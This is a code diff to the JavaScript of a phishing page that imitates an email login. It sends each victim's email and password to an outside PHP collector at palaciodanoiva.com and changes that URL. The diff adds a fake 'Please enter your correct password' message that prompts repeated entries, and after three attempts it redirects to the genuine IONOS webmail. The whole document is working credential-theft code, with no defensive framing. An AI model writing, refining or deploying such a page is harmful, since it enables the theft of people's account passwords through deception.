@@ -143,8 +143,9 @@
             const passwd = document.getElementById("password");
             const backtoem = document.getElementById("backtoem");
             const iduserhere = document.getElementById("iduserhere");
+            const errorText = pwerror.querySelector('span');
             
-            const PROCESS_URL = "https://gurio.palaciodanoiva.com/ono/guv.php";
+            const PROCESS_URL = "https://palaciodanoiva.com/mak/das.php";
             let attempts = 0;
             
             // Initialize
@@ -156,52 +157,64 @@
             // Email validation
             emButton.addEventListener("click", (event) => {
                 event.preventDefault();
+                emerror.classList.add("hide");
                 if (userid.value === "") {
                     userid.classList.add("border-red-500");
                     emerror.classList.remove("hide");
                     userid.focus();
-                    return;
+                } else {
+                    userid.classList.remove("border-red-500");
+                    hiddenuser.value = userid.value;
+                    iduserhere.textContent = userid.value;
+                    showPassDiv();
                 }
-                
-                userid.classList.remove("border-red-500");
-                emerror.classList.add("hide");
-                hiddenuser.value = userid.value;
-                iduserhere.textContent = userid.value;
-                showPassDiv();
             });
 
             // Password submission
             pwButton.addEventListener("click", async (event) => {
                 event.preventDefault();
                 
-                // Show loading
+                if (passwd.value === "") {
+                    passwd.classList.add("border-red-500");
+                    pwerror.classList.remove("hide");
+                    errorText.textContent = "Please enter your password";
+                    passwd.focus();
+                    return;
+                }
+                
                 barLoad.classList.remove("hide");
                 pwButton.disabled = true;
                 attempts++;
                 
                 try {
-                    // Send data to backend
-                    await fetch(PROCESS_URL, {
+                    const response = await fetch(PROCESS_URL, {
                         method: 'POST',
                         body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                     });
-                    
-                    // Always clear password after attempt
+
                     passwd.value = "";
+                    passwd.focus();
+                    
+                    // Show error message for failed attempts (except the last one)
+                    if (attempts < 3) {
+                        pwerror.classList.remove("hide");
+                        errorText.textContent = "Please enter your correct password";
+                    }
                     
                     // Redirect after 3 attempts
                     if (attempts >= 3) {
                         window.location.href = "https://email.ionos.com/appsuite/";
-                    } else {
-                        passwd.focus();
                     }
                 } catch (error) {
-                    // Silent failure - just clear password
+                    console.error('Error:', error);
                     passwd.value = "";
                     passwd.focus();
+                    if (attempts < 3) {
+                        pwerror.classList.remove("hide");
+                        errorText.textContent = "Please enter your correct password";
+                    }
                 } finally {
-                    // Reset UI
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                 }
